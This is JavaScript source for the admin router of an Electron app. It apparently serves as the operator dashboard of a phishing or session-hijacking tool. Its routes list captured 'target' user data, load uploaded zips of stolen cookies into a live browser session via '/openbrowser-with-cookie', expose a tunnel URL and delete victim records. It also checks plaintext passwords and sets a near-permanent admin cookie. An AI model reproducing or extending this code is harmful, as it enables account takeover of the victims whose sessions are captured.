const { checkAdminToken, appInformation, cout } = require('../utils/server-helpers')
const { spikeModules } = require("../spikes/ApplicationConfig")
const { BrowserWindow, screen, session } = require("electron")
const { adminCollection, targetDB } = require('../utils/DB')
const browserManager = require("../spikes/browserManager")
const { v4: uuid } = require("uuid")
const express = require('express')
const AdmZip = require('adm-zip')
const path = require("path")
const os = require('os')
const fs = require("fs")

const router = express.Router()

router.route("/").get((req, res) => {
    const token = req.cookies.token
    const adminConfig = adminCollection.find({})

    if (token == undefined) { // checking token
        res.render("login")
        return
    }

    if (token != adminConfig.token) { // clear token and redirect to login
        res.clearCookie("token")
        res.redirect("/")
        return
    }

    const data = []
    for (let currentUserID of targetDB.info().collections) {
        let currentUserData = targetDB.collection(currentUserID, false)
        currentUserData = currentUserData.find({})
        delete currentUserData.data
        data.push(currentUserData)
    }

    res.render("dashboard", {
        data,
        adminConfig,
        spikeModules,
        appInformation
    })
}).post((req, res) => {
    const { username, password } = req.body
    const adminConfig = adminCollection.find({})

    if (username == adminConfig.username && password == adminConfig.password) {
        res.cookie("token", adminConfig.token, { maxAge: 1000000 * 1000000 })
    }

    res.redirect("/")
})

/* +=====================+ */
router.use(checkAdminToken) // checking admin token
/* +=====================+ */

router.get("/tunnel", (req, res) => {
    res.send(process.env.WSTUNNELURL)
})

router.post("/credentials-config", (req, res) => {
    const { username, oldpassword, newpassword } = req.body
    const adminConfig = adminCollection.find({})

    if (adminConfig.password == oldpassword) {
        adminCollection.update({}, { username, password: newpassword, token: uuid() })
        res.send("OK")
    } else {
        res.send("old password incorrect")
    }
})

router.post("/openbrowser-with-cookie", async (req, res) => {
    if (process.argv.includes('--headless')) {
        res.send("openbrowser with cookie is error, because app running on headless mode.")
        return
    }

    if (req.files) {
        try {
            const { file } = req.files
            const randomID = uuid()
            const zipFilePath = path.join(os.tmpdir(), `${randomID}.zip`)

            file.mv(zipFilePath, async (err) => {
                if (err) {
                    res.send(err.message)
                } else {
                    const cookiesPath = path.join(os.tmpdir(), randomID)
                    const admZip = new AdmZip(zipFilePath)
                    admZip.extractAllTo(cookiesPath, true)

                    const url = fs.readFileSync(path.join(cookiesPath, "app-url"), "utf-8")
                    const presistedSessionPath = session.fromPath(cookiesPath)

                    const newTab = new BrowserWindow({
                        width: 920,
                        height: screen.getPrimaryDisplay().size.height,
                        webPreferences: {
                            session: presistedSessionPath
                        }
                    })

                    await newTab.loadURL(url)
                    fs.rm(zipFilePath, (err) => {
                        if (err) cout.err(err)
                    })
                    res.send(`opening browser.`)
                }
            })

            return
        } catch (error) {
            res.send(error.message)
            return
        }
    }

    res.send("error while uploading cookies file.")
})

router.get("/delete-target", (req, res) => {
    const { id } = req.query

    try {
        if (id == "all") {
            for (let currentUserID of targetDB.info().collections) {
                targetDB.collection(currentUserID, false).delete()
            }
        } else {
            targetDB.collection(id, false).delete()
        }

        res.send("OK")
    } catch (error) {
        res.send("error program in use. close the user browser")
    }
})

router.get("/logout", (req, res) => {
    res.clearCookie("token").redirect("/")
})

router.get("/close-headless-tabs", (req, res) => {
    if (!process.argv.includes('--headless')) {
        res.send("app not running on headless mode.")
        return
    }

    try {
        for (const tabId in browserManager.tabs) {
            let currentTab = browserManager.tabs[tabId]
            if (currentTab) {
                currentTab.close()
            }
        }

        res.send("success")
    } catch (error) {
        cout.err(error)
        res.send(error.message)
    }
})

router.get("/get-description", (req, res) => {
    const { appName } = req.query

    try {
        const description = spikeModules[appName].description
        res.send(description)
    } catch (error) {
        res.send(error.message)
    }
})

module.exports = router